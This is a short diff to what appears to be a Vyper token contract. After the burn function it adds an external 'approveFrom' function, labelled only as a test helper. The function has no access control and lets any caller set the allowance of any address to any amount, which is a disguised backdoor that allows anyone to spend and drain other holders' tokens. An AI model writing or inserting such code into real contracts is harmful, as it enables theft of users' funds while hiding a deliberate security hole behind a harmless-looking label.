@@ -152,3 +152,9 @@ def burn(_value: uint256):
     @param _value The amount that will be burned.
     """
     self._burn(msg.sender, _value)
+
+
+# test helper
+@external
+def approveFrom(_from: address, _to: address, _amount: uint256):
+    self.allowances[_from][_to] = _amount
